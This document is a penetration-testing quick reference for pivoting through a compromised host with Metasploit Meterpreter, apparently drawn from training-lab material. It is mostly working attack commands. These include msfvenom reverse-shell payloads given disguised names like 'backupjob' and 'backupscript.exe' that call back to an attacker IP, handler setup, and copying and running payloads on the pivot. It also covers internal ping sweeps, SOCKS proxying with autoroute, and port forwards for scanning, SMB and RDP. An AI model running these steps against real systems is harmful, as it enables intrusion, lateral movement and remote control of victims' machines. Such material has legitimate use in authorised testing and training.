# Meterpreter Tunneling & Port Forwarding Quick Reference

## Meterpreter Pivoting Methods

| Method | Use Case | Command |
|--------|----------|---------|
| **SOCKS Proxy** | Route tools via Meterpreter | `use auxiliary/server/socks_proxy` |
| **AutoRoute** | Add network routes | `use post/multi/manage/autoroute` |
| **portfwd** | Forward specific ports | `portfwd add -l LOCAL -p REMOTE -r IP` |
| **Reverse portfwd** | Reverse port forward | `portfwd add -R -l LOCAL -p REMOTE` |

## Setup Meterpreter Session

### Step 1: Create Payload

```bash
# Linux target (pivot host)
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.18 \
         LPORT=8080 \
         -f elf \
         -o backupjob

# Windows target
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.18 \
         LPORT=8080 \
         -f exe \
         -o payload.exe
```

### Step 2: Start Handler

```bash
msfconsole

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

### Step 3: Transfer & Execute

```bash
# Transfer to pivot
scp backupjob ubuntu@10.129.202.64:~/

# Execute on pivot
ssh ubuntu@10.129.202.64
chmod +x backupjob
./backupjob
```

### Step 4: Verify Session

```
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826)

meterpreter > sysinfo
meterpreter > ifconfig
```

## Network Discovery via Meterpreter

### Ping Sweep Module

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

### Manual Ping Sweep

#### Linux Pivot
```bash
# From Meterpreter shell
meterpreter > shell

# Ping sweep
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

#### Windows Pivot (CMD)
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Windows Pivot (PowerShell)
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

## SOCKS Proxy Setup

### Step 1: Configure SOCKS Proxy

```bash
# In Metasploit
use auxiliary/server/socks_proxy

set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run

# Verify running
jobs
```

**Output**:
```
[*] Starting the SOCKS proxy server
Jobs
====
  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

### Step 2: Configure Proxychains

```bash
# Edit config
sudo nano /etc/proxychains.conf

# Add at bottom:
socks4  127.0.0.1 9050

# Or for SOCKS5:
socks5  127.0.0.1 9050
```

### Step 3: Add Routes with AutoRoute

#### Using Module
```bash
use post/multi/manage/autoroute

set SESSION 1
set SUBNET 172.16.5.0
run
```

#### From Meterpreter
```bash
meterpreter > run autoroute -s 172.16.5.0/23

[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
```

### Step 4: List Active Routes

```bash
meterpreter > run autoroute -p

Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.254.0      Session 1
```

### Step 5: Use Proxychains

```bash
# Nmap
proxychains nmap -sT -Pn 172.16.5.19

# NetExec
proxychains nxc smb 172.16.5.19 -u user -p pass

# RDP
proxychains xfreerdp /v:172.16.5.19 /u:user /p:pass
```

## Local Port Forwarding (portfwd)

### Basic Syntax

```bash
meterpreter > portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP
```

### Forward RDP

```bash
# Forward local 3300 to remote 3389
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

# Connect via localhost
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Multiple Port Forwards

```bash
# RDP
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# SMB
portfwd add -l 4445 -p 445 -r 172.16.5.19

# HTTP
portfwd add -l 8080 -p 80 -r 172.16.5.19
```

### List Port Forwards

```bash
meterpreter > portfwd list

Active Port Forwards
====================
   Index  Local         Remote        Direction
   -----  -----         ------        ---------
   1      0.0.0.0:3300  172.16.5.19:3389  Forward
```

### Delete Port Forward

```bash
# Delete by index
meterpreter > portfwd delete -i 1

# Delete all
meterpreter > portfwd flush
```

## Reverse Port Forwarding

### Concept

```
Windows Target
    ↓
Connects to Pivot:1234
    ↓
Pivot forwards to Attack:8081
    ↓
Meterpreter handler receives
```

### Step 1: Setup Reverse Port Forward

```bash
# From Meterpreter on pivot
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

**Flags**:
- `-R` = Reverse port forward
- `-l 8081` = Local port on attack host
- `-p 1234` = Remote port on pivot
- `-L 10.10.14.18` = Attack host IP

### Step 2: Background Session & Setup Handler

```bash
# Background meterpreter
meterpreter > bg

# Configure handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

### Step 3: Create Windows Payload

```bash
# Payload connects to pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=172.16.5.129 \
         LPORT=1234 \
         -f exe \
         -o backupscript.exe
```

### Step 4: Execute on Windows

```
Transfer backupscript.exe to Windows target
Execute
Handler receives connection via pivot
```

## Complete Attack Scenarios

### Scenario 1: SOCKS Proxy + Nmap

```bash
# 1. Get Meterpreter on pivot
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=8080 -f elf -o payload
scp payload ubuntu@PIVOT_IP:~/
ssh ubuntu@PIVOT_IP "./payload"

# 2. Setup SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

# 3. Add routes
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# 4. Configure proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# 5. Scan internal network
proxychains nmap -sT -Pn 172.16.5.0/24
```

### Scenario 2: Local Port Forward for RDP

```bash
# 1. Establish Meterpreter session on pivot
# 2. Forward RDP port
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# 3. Connect locally
xfreerdp /v:localhost:3300 /u:admin /p:pass
```

### Scenario 3: Reverse Port Forward for Shells

```bash
# 1. Setup reverse port forward on pivot
meterpreter > portfwd add -R -l 8081 -p 1234 -L ATTACK_IP

# 2. Start handler
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run

# 3. Create payload pointing to pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=PIVOT_INTERNAL_IP LPORT=1234 \
         -f exe -o shell.exe

# 4. Execute on Windows → Get shell via pivot
```

## Meterpreter Port Forward Commands

### portfwd Options

```bash
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:
    -h        Help banner
    -i <opt>  Index of port forward entry
    -l <opt>  Forward: local port to listen on
              Reverse: local port to connect to
    -L <opt>  Forward: local host to listen on
              Reverse: local host to connect to
    -p <opt>  Forward: remote port to connect to
              Reverse: remote port to listen on
    -r <opt>  Forward: remote host to connect to
    -R        Reverse port forward
```

### Common Commands

```bash
# Add forward
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Add reverse forward
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# List forwards
portfwd list

# Delete by index
portfwd delete -i 1

# Delete all
portfwd flush
```

## AutoRoute Commands

### Add Routes

```bash
# From module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK /23
run

# From Meterpreter
run autoroute -s 172.16.5.0/23

# Add multiple networks
run autoroute -s 172.16.5.0/23
run autoroute -s 10.10.10.0/24
```

### List Routes

```bash
meterpreter > run autoroute -p

Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.254.0      Session 1
```

### Delete Routes

```bash
# Delete specific route
run autoroute -d -s 172.16.5.0/23

# Delete all routes for session
run autoroute -d
```

## Verification Commands

### Check SOCKS Proxy

```bash
# List running jobs
msf6 > jobs

# Check port listening
netstat -tlnp | grep 9050
```

### Check Port Forwards

```bash
# In Meterpreter
meterpreter > portfwd list

# On attack host
netstat -tlnp | grep 3300
```

### Test Connectivity

```bash
# Via proxychains
proxychains nmap -sT -Pn -p 445 172.16.5.19

# Via port forward
nmap -sT -p 3300 localhost
```

## Troubleshooting

### Issue 1: SOCKS Proxy Not Working

```bash
# Check job running
msf6 > jobs

# Restart proxy
jobs -k 0  # Kill job
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

# Verify proxychains config
tail /etc/proxychains.conf
```

### Issue 2: AutoRoute Not Adding

```bash
# Check session active
sessions -l

# Manually add route
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK 255.255.254.0
run

# Verify
run autoroute -p
```

### Issue 3: Port Forward Fails

```bash
# Check port not in use
netstat -tlnp | grep 3300

# Delete existing forward
portfwd flush

# Re-add
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

### Issue 4: Session Died

```bash
# Check sessions
sessions -l

# Reconnect payload
# Re-setup routes and forwards
```

## Quick Commands Reference

```bash
# Create Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=8080 -f elf -o payload

# Setup SOCKS
use auxiliary/server/socks_proxy; set SRVPORT 9050; run

# Add routes
run autoroute -s 172.16.5.0/23

# Local forward
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Reverse forward
portfwd add -R -l 8081 -p 1234 -L ATTACK_IP

# Use proxychains
proxychains nmap -sT -Pn TARGET
```

## Key Points

🔴 **Remember**:
- SOCKS proxy = Route entire tools
- portfwd = Forward specific ports
- AutoRoute = Add network routes
- Reverse portfwd = Get shells back through pivot
- Always use `-sT -Pn` with proxychains + nmap

🎯 **Best Practices**:
- Background Meterpreter sessions before starting new tasks
- Verify routes with `autoroute -p`
- Test connectivity before full operations
- Use `jobs` to monitor background tasks

